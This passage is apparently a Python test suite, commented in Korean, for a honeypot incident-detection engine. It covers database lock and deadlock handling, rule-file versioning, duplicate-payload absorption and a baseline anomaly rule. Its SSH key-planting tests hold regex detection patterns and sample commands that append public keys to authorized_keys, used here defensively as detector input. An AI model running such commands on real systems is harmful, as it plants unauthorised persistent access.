        cur.execute("SET lock_timeout = '10s'")     # 고치기 전 코드면 교착 검출(1초)이 먼저 끊는다
        conn.commit()
        return conn

    def tearDown(self):
        for conn in (self.detector, self.console):
            conn.rollback()
            conn.close()
        cur = self.admin.cursor()
        cur.execute(f"DROP SCHEMA {self.schema} CASCADE")
        self.admin.commit()
        self.admin.close()

    def wait_blocked(self, conn):
        """conn 의 문장이 다른 트랜잭션의 잠금을 기다리기 시작할 때까지."""
        cur = self.admin.cursor()
        for _ in range(500):
            cur.execute("SELECT cardinality(pg_blocking_pids(%s))", (conn.get_backend_pid(),))
            blocked = cur.fetchone()[0]
            self.admin.commit()
            if blocked:
                return
            time.sleep(0.01)
        self.fail("잠금을 기다리지 않았습니다")

    def in_thread(self, fn):
        out = {}

        def body():
            try:
                out["value"] = fn()
            except Exception as e:           # 교착 · 잠금 시간 초과를 주 스레드에서 본다
                out["error"] = e
        t = threading.Thread(target=body)
        t.start()
        return t, out

    def state(self, key):
        cur = self.admin.cursor()
        cur.execute(f"SELECT last_ts, signal_count, session_count, evidence, status FROM {self.schema}.incidents "
                    "WHERE incident_key = %s", (key,))
        row = cur.fetchone()
        self.admin.commit()
        return row

    def count(self, table, key):
        cur = self.admin.cursor()
        cur.execute(f"SELECT count(*) FROM {self.schema}.{table} WHERE incident_key = %s", (key,))
        n = cur.fetchone()[0]
        self.admin.commit()
        return n

    @staticmethod
    def row(key, rid, severity, first, last, n, sample):
        return (key, rid, "t1", "시험", severity, "192.0.2.8", at(first), at(last), n, 1,
                json.dumps({"sample": sample, "sessions": []}))

    def test_잠금을_기다린_적재는_그사이_커밋된_판정의_근거를_덮지_않는다(self):
        d, c = self.detector.cursor(), self.console.cursor()
        d.execute(detect.INSERT_BASE, self.row("B", "R003", "high", 0, 10, 2, ["b1"]))
        self.detector.commit()
        before = self.state("B")
        c.execute("INSERT INTO verdicts (incident_key, verdict) VALUES ('B', 'threat')")
        c.execute("UPDATE incidents SET status = 'resolved' WHERE incident_key = 'B'")   # 커밋 전

        def grow():
            d.execute(detect.INSERT_BASE, self.row("B", "R003", "high", 0, 30, 5, ["b1", "b2"]))
            return d.rowcount
        t, out = self.in_thread(grow)
        self.wait_blocked(self.detector)             # 적재 문장은 판정이 보이지 않는 스냅샷으로 시작했다
        self.console.commit()
        t.join(15)
        self.detector.commit()
        self.assertNotIn("error", out)
        self.assertEqual(out["value"], 0)
        self.assertEqual(self.state("B"), before[:4] + ("resolved",))

    def test_억제는_콘솔이_조치를_넣는_중인_사건을_건너뛰고_교착하지_않는다(self):
        d, c = self.detector.cursor(), self.console.cursor()
        low = self.row("L", "R001", "medium", 0, 10, 2, ["l1"])
        d.execute(detect.INSERT_BASE, low)                   # 지난 회차에 뜬 사건
        self.detector.commit()
        c.execute("INSERT INTO actions (incident_key, action) VALUES ('L', 'acknowledge')")   # FK 로 행을 잡는다

        # 이번 회차: L 이 다시 나와 충돌 행이 잠기고, 같은 출발지 · 겹치는 구간에 더 높은 심각도 H 가 새로 뜬다
        high = self.row("H", "R002", "high", 5, 20, 1, ["h1"])
        d.execute(detect.INSERT_BASE, low)
        d.execute(detect.INSERT_BASE, high)

        def ack():
            c.execute("UPDATE incidents SET status = 'acknowledged' WHERE incident_key = 'L'")
            self.console.commit()
        t, out = self.in_thread(ack)
        self.wait_blocked(self.console)              # 콘솔은 탐지가 잠근 L 을 기다린다
        counts = detect.suppress(d, SuppressTest.CONF, SuppressTest.staged(low, high))
        self.detector.commit()
        t.join(15)
        self.assertNotIn("error", out)
        self.assertEqual(counts, {"R001": 1})
        self.assertEqual(self.state("L")[4], "acknowledged")     # 이번 회차에는 지우지 않았다
        self.assertEqual(self.count("actions", "L"), 1)          # 조치 기록도 남았다

    def test_억제는_손대지_않은_사건만_지운다(self):
        d = self.detector.cursor()
        rows = [self.row("L1", "R001", "medium", 0, 10, 2, []), self.row("L2", "R001", "medium", 30, 40, 2, []),
                self.row("L3", "R001", "medium", 50, 60, 2, [])]
        for r in rows:
            d.execute(detect.INSERT_BASE, r)
        self.detector.commit()
        c = self.console.cursor()
        c.execute("INSERT INTO actions (incident_key, action) VALUES ('L2', 'note')")
        c.execute("INSERT INTO verdicts (incident_key, verdict) VALUES ('L3', 'threat')")
        self.console.commit()
        high = self.row("H", "R002", "high", 5, 55, 1, [])
        for r in rows + [high]:
            d.execute(detect.INSERT_BASE, r)
        detect.suppress(d, SuppressTest.CONF, SuppressTest.staged(*rows, high))
        self.detector.commit()
        self.assertEqual([self.state(k) is not None for k in ("L1", "L2", "L3", "H")], [False, True, True, True])

    def test_흡수_삭제도_콘솔이_조치를_넣는_중인_사건은_건너뛴다(self):
        # v3 같은 페이로드 흡수. 억제와 같은 잠금 문장이라 같은 상황에서 같은 답이어야 한다
        d, c = self.detector.cursor(), self.console.cursor()
        first = ("F", "R003", "t1", "시험", "critical", "192.0.2.1", at(0), at(0), 1, 1,
                 json.dumps({"sample": [], "sessions": []}))
        dups = [self.row("V1", "R003", "critical", 30, 30, 1, []), self.row("V2", "R003", "critical", 40, 40, 1, [])]
        for r in [first] + dups:
            d.execute(detect.INSERT_BASE, r)
        self.detector.commit()
        c.execute("INSERT INTO actions (incident_key, action) VALUES ('V1', 'block_ip')")     # FK 로 V1 을 잡는다
        for r in [first] + dups:                                 # 이번 회차 적재
            d.execute(detect.INSERT_BASE, r)

        def ack():
            c.execute("UPDATE incidents SET status = 'acknowledged' WHERE incident_key = 'V1'")
            self.console.commit()
        t, out = self.in_thread(ack)
        self.wait_blocked(self.console)
        got = detect.remove_incidents(d, [], [{"victim": k, "first_key": "F", "sessions": [], "payloads": ["p"]}
                                              for k in ("V1", "V2")])
        self.detector.commit()
        t.join(15)
        self.assertNotIn("error", out)
        self.assertEqual(got, {"R003": 1})
        self.assertEqual(self.state("V1")[4], "acknowledged")
        self.assertEqual(self.count("actions", "V1"), 1)
        self.assertIsNone(self.state("V2"))
        self.assertIsNotNone(self.state("F"))
        cur = self.admin.cursor()
        cur.execute(f"SELECT first_key, member_key FROM {self.schema}.incident_absorbed")
        self.assertEqual(cur.fetchall(), [("F", "V2")])           # 지운 것만 기록된다
        self.admin.commit()


# ----------------------------------------------------------------------
#  v3 (2회차): 같은 페이로드 흡수 · R006 키 심기 · R005 이전 7일 기준선
# ----------------------------------------------------------------------

# ssh-keygen 으로 만든 공개키와 ssh-keygen -l 이 준 지문. 엔진의 지문 계산과 따로 얻은 값이다
ED_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICFrwsLAxntuXaCphG/zgHz3yi9QGuzxThLcznMXQZP7"
ED_FP = "SHA256:wOweE+NZQmsqfGgtciqlpu08CYKvCUvWdMxK/9y5JXM"
RSA_KEY = ("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCxfQtwj/Dwr0PW/O+rytLvBOSt1zYTPcKkBv09uYZTtgMvCUCKk+6/bEVb61"
           "Rita6fVHCVlt1+nXbadK5Q5oQQjW9S9OVUOzbH5IDK4q1lh+/QV0TKpwFFAl4yKiT7Ob1JpKEHlbboxjCx9c7CHvyiSLItB2sNm4HgP4wi"
           "SE9eJw==")
RSA_FP = "SHA256:1SndrI6Z80eDHyJNZDpZjKd7F7WMbmdgVunqGZjMGQ4"
REF_SQL = "SELECT %s::timestamptz, least(%s::timestamptz, now())"
# authorized_keys(2) 라는 이름의 파일에 쓰는 것. 따옴표로 끊긴 경로를 받고 .bak 같은 다른 이름은 받지 않는다
_KEYS_FILE = r"""(?:[^\s;&|<>]*[/'"])?authorized_keys2?['"]?"""
_END = r"""(?=$|[\s;&|)<>])"""
WRITE_PATTERNS = [r">>?\|?\s*" + _KEYS_FILE + _END,                                  # 리다이렉트
                  r"\ytee\y[^;&|]*\s" + _KEYS_FILE + _END,                           # tee
                  r"\y(?:cp|mv|install)\y[^;&|]*\s" + _KEYS_FILE + r"\s*(?=$|[;&|)])",  # 마지막 인자
                  r"\ydd\y[^;&|]*\sof=" + _KEYS_FILE + _END]                          # dd of=


def sha(text):
    return hashlib.sha256(text.encode()).hexdigest()


def v3_answer(ref=(None, datetime(2100, 1, 1, tzinfo=UTC)), extra=None):
    """v3 run() 이 부르는 질의에 대한 응답. 기준 시각 질의에는 ref, 나머지는 extra 가 먼저 답한다."""
    def answer(sql):
        if sql == REF_SQL:
            return [ref]
        got = extra(sql) if extra else None
        return db_answer()(sql) if got is None else got
    return answer


def v3_collect(rule, answer, since=None, until=None, version="v3"):
    rule = copy.deepcopy(rule)
    rule.setdefault("params", {})["_version"] = version
    cur = FakeCursor(answer)
    sig = detect.COLLECTORS[rule["type"]](cur, rule, since, until)
    return sig, cur.log


class RuleFileV3Test(unittest.TestCase):
    """rules_v3.json. v2 에서 바꾸기로 한 것만 바뀌었다."""

    def test_형식과_순서(self):
        doc = load("rules_v3.json")
        self.assertEqual(doc["rule_version"], "v3")
        self.assertTrue(doc["note"])
        # R005 는 앞 규칙의 인시던트를 보므로 마지막이다
        self.assertEqual([r["id"] for r in doc["rules"]], ["R001", "R002", "R003", "R004", "R006", "R005"])
        for rule in doc["rules"]:
            with self.subTest(rule=rule["id"]):
                self.assertIn(rule["type"], detect.COLLECTORS)
                self.assertIn(rule["severity"], detect.SEVERITY_RANK)
                self.assertTrue(rule["enabled"])
                self.assertTrue(rule["rationale"])
                self.assertTrue(rule["changed_from_v2"])

    def test_v2_에서_바꾼_것만(self):
        d2, d3 = load("rules_v2.json"), load("rules_v3.json")
        v2, v3 = {r["id"]: r for r in d2["rules"]}, {r["id"]: r for r in d3["rules"]}
        self.assertEqual((d3["aggregation"], d3["suppression"]), (d2["aggregation"], d2["suppression"]))
        same = ("name", "severity", "type", "enabled", "params", "aggregation_gap_seconds")
        for rid in ("R001", "R004"):
            with self.subTest(rule=rid):
                self.assertEqual({k: v3[rid].get(k) for k in same}, {k: v2[rid].get(k) for k in same})
        # R002: 무의미 명령 제외를 뺀다
        self.assertEqual(v3["R002"]["params"], {"expr": v2["R002"]["params"]["expr"]})
        # R003: 줄바꿈 1바이트 · 공개키 리다이렉트 저장을 빼고 같은 파일을 묶는다
        p3 = v3["R003"]["params"]
        self.assertEqual(p3["eventid_like"], v2["R003"]["params"]["eventid_like"])
        self.assertEqual(p3["exclude_shasum_prefixes"],
                         v2["R003"]["params"]["exclude_shasum_prefixes"] + ["01ba4719c80b6fe9"])
        self.assertIs(p3["exclude_pubkey_redir"], True)
        self.assertEqual(p3["absorb_same_payload"], {"window_hours": 24, "max_sources": 100})
        # R005: 이전 7일 기준선과 기다림을 더하고, 2회차 판정(무시 가능 9/9)으로 σ 를 3.0 에서 관측 분포 p99 인 4.5 로
        # 올리며 심각도를 low 로 내렸다(임시값). 7.0 은 관측한 모든 칸의 최대(6.90)를 넘어 규칙을 사실상 끈다
        self.assertEqual(v2["R005"]["params"]["sigma"], 3.0)
        self.assertEqual((v2["R005"]["severity"], v3["R005"]["severity"]), ("medium", "low"))
        self.assertIn("p99", v3["R005"]["rationale"])
        self.assertEqual(v3["R005"]["params"], {**v2["R005"]["params"], "sigma": 4.5, "baseline_days": 7,
                                                "settle_seconds": 1800})
        self.assertIn("재현율", v3["R005"]["rationale"])
        # R006: 신설, critical
        r6 = v3["R006"]
        self.assertEqual((r6["name"], r6["severity"], r6["type"]), ("SSH 키 심기", "critical", "key_plant"))
        self.assertEqual(r6["params"], {"sensors": ["cowrie"], "eventid": "cowrie.command.input",
                                        "write_patterns": WRITE_PATTERNS,
                                        "absorb_same_payload": {"window_hours": 24, "max_sources": 100}})
        self.assertNotIn("R006", v2)

    def test_운영_전환_전_필수_작업이_적혀_있다(self):
        todo = " ".join(load("rules_v3.json")["cutover_requires"])
        for word in ("20260925_v3_absorbed.sql", "block_ip", "triage", "incident_absorbed", "R006", "CIRCULAR",
                     "absorbed_blocks", "verify-db-roles.sh", "notify.sql", "OPSLOOP_RULES", "detector_runs",
                     "install-ingest.sh", "미판정"):
            self.assertIn(word, todo)

    def test_뺀_해시는_내용_없는_파일(self):
        self.assertTrue(hashlib.sha256(b"").hexdigest().startswith("e3b0c44298fc1c14"))
        self.assertTrue(hashlib.sha256(b"\n").hexdigest().startswith("01ba4719c80b6fe9"))    # 줄바꿈 한 글자

    def test_버전이_겹치지_않고_파일_그대로_등록(self):
        names = ("rules.json", "rules_v2.json", "rules_v3.json", "rules_self.json", "rules_node.json",
                 "rules_w1.json", "rules_audit.json", "rules_infra.json", "rules_cve.json")
        versions = [load(n)["rule_version"] for n in names]
        self.assertEqual(len(set(versions)), len(versions))
        doc = load("rules_v3.json")
        cur, _, _ = run_quiet(doc, v3_answer())
        sql, prm = cur.log[0]
        self.assertIn("INSERT INTO rule_versions", sql)
        self.assertEqual((prm[0], json.loads(prm[1]), prm[2]), ("v3", doc, doc["note"]))


class EventMatchV3Test(unittest.TestCase):
    """v3 R003. 옵션 두 개가 v2 문장 뒤에 붙고, 없으면 v2 와 같다(BeforeAfterTest)."""

    V2_SQL = BEFORE[("v2", "R003", False)][0][0]

    def test_문장과_인자(self):
        doc, rule = rule_of("rules_v3.json", "R003")
        [(sql, prm)] = collect(doc, rule)
        want = (self.V2_SQL.replace("coalesce(shasum, url, input, message) FROM",
                                    "coalesce(shasum, url, input, message), shasum FROM")
                + " AND (shasum IS NULL OR shasum NOT LIKE %s)" + detect.PUBKEY_REDIR_SQL)
        self.assertEqual(sql, want)
        # 키 정규식 뒤에 같은 파일 R006 의 eventid · write_patterns (R003 제외를 R006 탐지에 묶는다)
        self.assertEqual(prm, ["cowrie.session.file_%", "e3b0c44298fc1c14%", "01ba4719c80b6fe9%", detect.SSH_KEY_RE,
                               "cowrie.command.input", WRITE_PATTERNS])
        self.assertEqual(sql.count("%s"), len(prm))
        [(sql_r, prm_r)] = collect(doc, rule, SINCE, UNTIL)
        self.assertEqual(sql_r, want.replace("provenance = 'real' AND", "provenance = 'real' AND ts >= %s AND ts < %s AND", 1))
        self.assertEqual(prm_r, [SINCE, UNTIL] + prm)

    def test_흡수가_없으면_해시_열도_없다(self):
        doc, rule = rule_of("rules_v3.json", "R003")
        rule = copy.deepcopy(rule)
        del rule["params"]["absorb_same_payload"]
        [(sql, _)] = collect(doc, rule)
        self.assertIn("message) FROM events", sql)
        self.assertTrue(sql.endswith(detect.PUBKEY_REDIR_SQL))
        sig = signals_of(doc, rule, lambda q: [(at(0), "4.4.4.4", "x", "cowrie.session.file_upload", "abc")])
        self.assertEqual(sig, [(at(0), "4.4.4.4", "x", {"eventid": "cowrie.session.file_upload", "detail": "abc"})])

    def test_신호는_해시를_페이로드로(self):
        doc, rule = rule_of("rules_v3.json", "R003")
        sig = signals_of(doc, rule, lambda q: [(at(0), "4.4.4.4", "x", "cowrie.session.file_upload", "abc", "abc"),
                                               (at(1), "4.4.4.4", "x", "cowrie.session.file_download", "http://u", None)])
        self.assertEqual([d["_payload"] for _, _, _, d in sig], [["abc"], []])
        self.assertEqual(detect.strip_control(sig[0][3]), {"eventid": "cowrie.session.file_upload", "detail": "abc"})

    def test_묶을_R006_이_없으면_규칙_오류(self):
        doc, rule = rule_of("rules_v3.json", "R003")
        for rules in ([r for r in doc["rules"] if r["id"] != "R006"],
                      [dict(r, enabled=False) if r["id"] == "R006" else r for r in doc["rules"]],
                      doc["rules"] + [dict(next(r for r in doc["rules"] if r["id"] == "R006"), id="R007")]):
            with self.subTest(rules=[r["id"] for r in rules if r.get("enabled", True)]):
                with self.assertRaises(ValueError):
                    collect(dict(doc, rules=rules), rule)
        # run() 을 거치지 않고 신호 함수만 부르면(제어 인자 없음) 묶을 곳을 몰라 멈춘다
        r = copy.deepcopy(rule)
        r["params"]["_version"] = "v3"
        with self.assertRaises(ValueError):
            detect.signals_event_match(FakeCursor(), r, None, None)

    def test_형식이_틀리면_규칙_오류(self):
        doc, rule = rule_of("rules_v3.json", "R003")
        for key, bad in (("exclude_pubkey_redir", "yes"), ("exclude_pubkey_redir", 1),
                         ("absorb_same_payload", {"window_hours": 0}), ("absorb_same_payload", {"window_hours": "24"}),
                         ("absorb_same_payload", {"window_hours": 24, "max_sources": 0}),
                         ("absorb_same_payload", {"window_hours": True}), ("absorb_same_payload", 24)):
            with self.subTest(key=key, bad=bad):
                r = copy.deepcopy(rule)
                r["params"][key] = bad
                with self.assertRaises(ValueError):
                    collect(doc, r)


class KeyPlantTest(unittest.TestCase):
    """v3 R006. authorized_keys 에 쓰는 명령 입력과 심은 키의 지문."""

    def test_지문은_ssh_keygen_과_같다(self):
        self.assertEqual(detect.key_fingerprint(ED_KEY.split()[1]), ED_FP)
        self.assertEqual(detect.key_fingerprint(RSA_KEY.split()[1]), RSA_FP)
        self.assertIsNone(detect.key_fingerprint(ED_KEY.split()[1][:-1]))       # base64 가 깨졌다

    def test_문장과_인자(self):
        doc, rule = rule_of("rules_v3.json", "R006")
        for rng in ((None, None), (SINCE, UNTIL)):
            with self.subTest(rng=rng):
                [(sql, prm)] = collect(doc, rule, *rng)
                period = " AND ts >= %s AND ts < %s" if rng[0] else ""
                self.assertEqual(sql, f"SELECT ts, src_ip, session, input FROM events WHERE provenance = 'real'"
                                      f"{period} AND sensor = ANY(%s) AND eventid = %s AND input ~ ANY(%s)")
                self.assertEqual(prm, [x for x in rng if x] + [["cowrie"], "cowrie.command.input", WRITE_PATTERNS])

    def test_신호와_지문(self):
        doc, rule = rule_of("rules_v3.json", "R006")
        cmds = [f'cd ~ && echo "{ED_KEY} lab@test">>.ssh/authorized_keys && chmod -R go= ~/.ssh',
                f'echo "{ED_KEY} other" >> ~/.ssh/authorized_keys; echo {RSA_KEY} | tee -a ~/.ssh/authorized_keys',
                "cat /tmp/k >> /root/.ssh/authorized_keys",
                f'echo "{ED_KEY[:-1]}" >> ~/.ssh/authorized_keys']
        sig = signals_of(doc, rule, lambda q: [(at(i), "5.5.5.5", f"s{i}", c) for i, c in enumerate(cmds)])
        self.assertEqual([d["key_fps"] for _, _, _, d in sig], [[ED_FP], [ED_FP, RSA_FP], [], []])
        self.assertEqual([d["_payload"] for _, _, _, d in sig], [[ED_FP], [ED_FP, RSA_FP], [], []])
        self.assertEqual(detect.strip_control(sig[0][3]),
                         {"eventid": "cowrie.command.input", "detail": cmds[0], "key_fps": [ED_FP]})

    def test_키_정규식이_주석을_한_토막만_잡는다(self):
        m = re.search(detect.SSH_KEY_RE, f'echo "{ED_KEY} mdrfckr">>.ssh/authorized_keys')
        self.assertEqual(m.groups(), ("ssh-ed25519", ED_KEY.split()[1], "mdrfckr"))
        self.assertIsNone(re.search(detect.SSH_KEY_RE, f"printf '{RSA_KEY}' > k").group(3))

    def test_형식이_틀리면_규칙_오류(self):
        doc, rule = rule_of("rules_v3.json", "R006")
        for bad in ([], "authorized_keys", [""], None, [1]):
            with self.subTest(bad=bad):
                r = copy.deepcopy(rule)
                r["params"]["write_patterns"] = bad
                with self.assertRaises(ValueError):
                    collect(doc, r)


class BaselineTrailingTest(unittest.TestCase):
    """v3 R005. 칸마다 이전 7일 기준선, 그 칸이 끝나기 전에 알림이 난 출발지만 뺀다, 끝나고 기다린 칸만 본다.

    칸 k 는 T0 + k시간. 평소 10 + k % 3 건이고 k = 10 에 10000 건이 있다(기준선 칸이 모자라 신호는 아니다).
    S1(9일 0시) · S2(+5시간) · S3(+10시간)에 60건씩. S2 의 55건은 S2 + 30분에 알림이 난 A, S3 의 55건은
    S3 + 1시간(칸이 끝난 시각, 미만이 아니다)에 알림이 난 B 의 것이다.
    """

    S1, S2, S3 = 216, 221, 226

    def rule(self, **params):
        _, rule = rule_of("rules_v3.json", "R005")
        rule = copy.deepcopy(rule)
        rule["params"].update(params)
        return rule

    def hour(self, k):
        return T0 + timedelta(hours=k)

    def answer(self, lo=None, ref=None):
        totals = [(self.hour(k), 10000 if k == 10 else 60 if k in (self.S1, self.S2, self.S3, self.S3 + 1)
                   else 10 + k % 3) for k in range(0, self.S3 + 2)]
        alerted = [("9.9.9.9", self.hour(self.S2) + timedelta(minutes=30)), ("8.8.8.8", self.hour(self.S3 + 1))]
        per = [(self.hour(self.S2), "9.9.9.9", 55), (self.hour(self.S3), "8.8.8.8", 55)]
        ref = ref or self.hour(self.S3 + 1) + timedelta(seconds=1800)      # S3 은 딱 기다림이 끝났다

        def answer(sql):
            if sql == REF_SQL:
                return [(lo, ref)]
            if sql == detect.ALERTED_SQL:
                return alerted
            if "host(src_ip) = ANY(%s)" in sql:
                return per
            if "date_trunc('hour', ts) h, count(*)" in sql:
                return totals
            return []
        return answer

    def test_문장과_인자(self):
        sig, log = v3_collect(self.rule(), self.answer(), SINCE, UNTIL)
        w = ("provenance = 'real' AND ts >= %s::timestamptz - make_interval(days => %s) AND ts < %s "
             "AND sensor = ANY(%s)")
        self.assertEqual(log, [
            (REF_SQL, [SINCE, UNTIL]),
            (f"SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE {w} GROUP BY 1 ORDER BY 1",
             [SINCE, 7, UNTIL, HONEYPOT]),
            (detect.ALERTED_SQL, ["v3", "R005", "v3", "R005"]),
            (f"SELECT date_trunc('hour', ts), host(src_ip), count(*) FROM events WHERE {w} "
             f"AND host(src_ip) = ANY(%s) GROUP BY 1, 2", [SINCE, 7, UNTIL, HONEYPOT, ["8.8.8.8", "9.9.9.9"]])])
        _, log = v3_collect(self.rule(), self.answer())
        self.assertEqual(log[1][1], [HONEYPOT])
        self.assertNotIn("make_interval", log[1][0])

    def test_이전_7일_창과_시점별_제외(self):
        sig, _ = v3_collect(self.rule(), self.answer())
        self.assertEqual([ts for ts, _, _, _ in sig], [self.hour(self.S1), self.hour(self.S3)])
        s1, s3 = sig[0][3], sig[1][3]
        # S1: 10000 건 칸(k = 10)은 7일 창 밖이다. 창 안은 10 · 11 · 12 가 56번씩
        self.assertEqual((s1["count"], s1["mean"], s1["sigma"], s1["limit"], s1["baseline_hours"],
                          s1["excluded_actors"]), (60, 11.0, 0.8, 14.7, 168, 0))      # 한계 = 평균 + 4.5σ
        # z 는 반올림 전 평균 · 표준편차로 잰다(반올림 값으로 재면 61.25). run() 은 이 값을 observed_sigma_max 로 쓴다
        self.assertEqual(s1["z"], round(49 / statistics.pstdev([10, 11, 12]), 2))
        # S2 는 A 를 빼면 5건. S3 은 B 가 칸이 끝난 뒤에 알림이 나 빼지 않는다. A 는 빠진다
        self.assertEqual((s3["count"], s3["excluded_actors"], s3["baseline_hours"]), (60, 1, 168))
        # 모든 칸을 기준선으로 쓰면 10000 건 칸 때문에 S1 이 뜨지 않는다 (v2 꼴)
        rule = self.rule(baseline_days=365)
        self.assertNotIn(self.hour(self.S1), [ts for ts, _, _, _ in v3_collect(rule, self.answer())[0]])

    def test_끝나고_기다린_칸만_since_뒤만(self):
        # S3 + 1 도 60건이지만 기다림이 1초 모자라다
        sig, _ = v3_collect(self.rule(), self.answer())
        self.assertNotIn(self.hour(self.S3 + 1), [ts for ts, _, _, _ in sig])
        sig, _ = v3_collect(self.rule(), self.answer(ref=self.hour(self.S3 + 1) + timedelta(seconds=1799)))
        self.assertEqual([ts for ts, _, _, _ in sig], [self.hour(self.S1)])
        sig, _ = v3_collect(self.rule(settle_seconds=0), self.answer(ref=self.hour(self.S3 + 2)))
        self.assertIn(self.hour(self.S3 + 1), [ts for ts, _, _, _ in sig])
        # since 앞 칸은 끝나고 기다린 시각(칸 + 1시간 + settle)이 since 이상일 때만 본다. 앞 구간(until = since)이
        # 기다림이 덜 차 보지 못한 칸이다. S1 은 S1 + 1.5시간에 볼 수 있으므로 since = S1 + 1시간이면 이번 구간이 본다
        sig, _ = v3_collect(self.rule(), self.answer(lo=self.hour(self.S1 + 1)))
        self.assertEqual([ts for ts, _, _, _ in sig], [self.hour(self.S1), self.hour(self.S3)])
        sig, _ = v3_collect(self.rule(), self.answer(lo=self.hour(self.S1 + 2)))
        self.assertEqual([ts for ts, _, _, _ in sig], [self.hour(self.S3)])

    def test_지운_인시던트의_출발지도_제외한다(self):
        sql = " ".join(detect.ALERTED_SQL.split())
        self.assertIn("FROM incidents WHERE rule_version = %s AND rule_id <> %s AND actor_ip IS NOT NULL", sql)
        self.assertIn("UNION ALL SELECT host(actor_ip), first_ts FROM incident_absorbed "
                      "WHERE rule_version = %s AND rule_id <> %s AND actor_ip IS NOT NULL", sql)
        self.assertTrue(sql.endswith("GROUP BY 1"))

    def test_형식이_틀리면_규칙_오류(self):
        for key, bad in (("baseline_days", 0), ("baseline_days", 7.5), ("baseline_days", True),
                         ("settle_seconds", -1), ("settle_seconds", "1800")):
            with self.subTest(key=key, bad=bad):
                with self.assertRaises(ValueError):
                    v3_collect(self.rule(**{key: bad}), self.answer())


class AbsorbTest(unittest.TestCase):
    """같은 페이로드 흡수. 창은 닻(첫 사건)에서 재고, 페이로드가 모두 창 안이면 흡수된다."""

    @staticmethod
    def group(key, ip, minutes, *payloads, bare=0):
        t = at(minutes)
        return [key, ip, t, {p: t for p in payloads}, {"sample": []}, [f"s-{key}"], bare]

    @staticmethod
    def item(key, ip, minutes):
        return {"key": key, "actor_ip": ip, "first_ts": at(minutes).isoformat(), "sessions": [f"s-{key}"]}

    def groups(self):
        day = 24 * 60
        return [self.group("A", "1.1.1.1", 0, "P"),
                self.group("G", "6.6.6.6", 30, "P", "Q"),           # Q 가 새 페이로드라 남는다(Q 의 닻)
                self.group("H", "7.7.7.7", 40),                     # 페이로드 없음
                self.group("J", "8.8.8.8", 50, "P", "Q"),           # P 는 A, Q 는 G 창 안 → 이른 닻 A
                self.group("B", "2.2.2.2", 60, "P"),
                self.group("C", "1.1.1.1", 120, "P"),               # 첫 사건과 같은 출발지
                self.group("I", "2.2.2.2", 180, "P"),               # 같은 출발지 다시
                self.group("D", "3.3.3.3", day, "P"),               # 닻에서 딱 24시간
                self.group("E", "4.4.4.4", day + 1, "P"),           # 24시간 1분 → 새 첫 사건
                self.group("F", "5.5.5.5", day + 60, "P")]

    def test_닻과_창(self):
        gs = self.groups()
        taken = detect.absorb_same_payload(gs, 24, 100)
        self.assertEqual(taken, {"J": "A", "B": "A", "C": "A", "I": "A", "D": "A", "F": "E"})
        ev = {g[0]: g[4] for g in gs}
        self.assertEqual(ev["A"]["absorbed"], {
            "window_hours": 24, "incidents": 5, "sources_total": 3, "sources": ["8.8.8.8", "2.2.2.2", "3.3.3.3"],
            "items": [self.item("J", "8.8.8.8", 50), self.item("B", "2.2.2.2", 60), self.item("C", "1.1.1.1", 120),
                      self.item("I", "2.2.2.2", 180), self.item("D", "3.3.3.3", 24 * 60)]})
        self.assertEqual(ev["E"]["absorbed"]["sources"], ["5.5.5.5"])
        self.assertNotIn("last_first_ts", ev["A"]["absorbed"])      # 지우기는 근거가 아니라 기록 표를 본다
        for k in ("G", "H"):
            self.assertEqual(ev[k], {"sample": []})
        self.assertEqual({k: ev[k].get("duplicate_of") for k in taken}, taken)

    def test_근거는_최대_수까지_총수는_전부(self):
        gs = self.groups()
        detect.absorb_same_payload(gs, 24, 1)
        a = gs[0][4]["absorbed"]
        self.assertEqual((a["sources"], a["items"], a["sources_total"], a["incidents"]),
                         (["8.8.8.8"], [self.item("J", "8.8.8.8", 50)], 3, 5))

    def test_창은_페이로드를_처음_본_시각으로(self):
        # L 은 23시간에 시작했지만 P 는 25시간에 처음 가져왔다 → 창 밖이라 새 첫 사건
        gs = [self.group("A", "1.1.1.1", 0, "P"), self.group("L", "2.2.2.2", 23 * 60)]
        gs[1][3] = {"P": at(25 * 60)}
        self.assertEqual(detect.absorb_same_payload(gs, 24, 10), {})

    def test_페이로드_없는_신호가_든_인시던트는_흡수되지_않는다(self):
        # 해시 없는 다운로드 실패 · 키가 적히지 않은 쓰기가 섞였으면 지우지 않는다. 가진 페이로드의 닻은 된다
        gs = [self.group("A", "1.1.1.1", 0, "P", bare=1),
              self.group("B", "2.2.2.2", 60, "P", bare=2),
              self.group("C", "3.3.3.3", 90, "P")]
        self.assertEqual(detect.absorb_same_payload(gs, 24, 10), {"C": "A"})
        self.assertEqual(gs[1][4], {"sample": []})
        self.assertEqual(gs[0][4]["absorbed"]["items"], [self.item("C", "3.3.3.3", 90)])

    DOC = {"rule_version": "x3", "aggregation": {"window_gap_seconds": 900},
           "suppression": {"absorb_by_higher_severity": True, "window_seconds": 900},
           "rules": [{"id": "X3", "name": "파일", "severity": "critical", "type": "event_match",
                      "params": {"eventid_like": "cowrie.session.file_%",
                                 "absorb_same_payload": {"window_hours": 24, "max_sources": 10}}},
                     {"id": "X4", "name": "경유", "severity": "medium", "type": "event_match",
                      "params": {"eventid": "cowrie.direct-tcpip.request"}}]}
    K_FIRST = f"X3|x3|1.1.1.1|{at(0).isoformat()}"
    K_DUP = f"X3|x3|2.2.2.2|{at(60).isoformat()}"
    K_LOW = f"X4|x3|2.2.2.2|{at(61).isoformat()}"

    def answer(self, removed):
        def answer(sql):
            if "eventid LIKE" in sql:
                return [(at(0), "1.1.1.1", "s1", "cowrie.session.file_upload", "aaa", "aaa"),
                        (at(60), "2.2.2.2", "s2", "cowrie.session.file_upload", "aaa", "aaa"),
                        (at(90), "3.3.3.3", "s3", "cowrie.session.file_upload", "bbb", "bbb")]
            if "eventid = %s" in sql:
                return [(at(61), "2.2.2.2", "s9", "cowrie.direct-tcpip.request", "x")]
            if sql == detect.SUPPRESS_LOCK_SQL:
                return [(self.K_DUP,), (self.K_LOW,)]
            if sql == detect.ABSORB_SQL:
                return removed
            return db_answer()(sql)
        return answer

    def test_run_은_흡수를_근거와_기록_표에_남기고_억제와_한_번에_지운다(self):
        cur = FakeCursor(self.answer([("X3", 1)]))
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            summary = detect.run(FakeConn(cur), copy.deepcopy(self.DOC), None, None, verbose=True)
        rows = {r[0]: r for _, rs in cur.batches for r in rs}
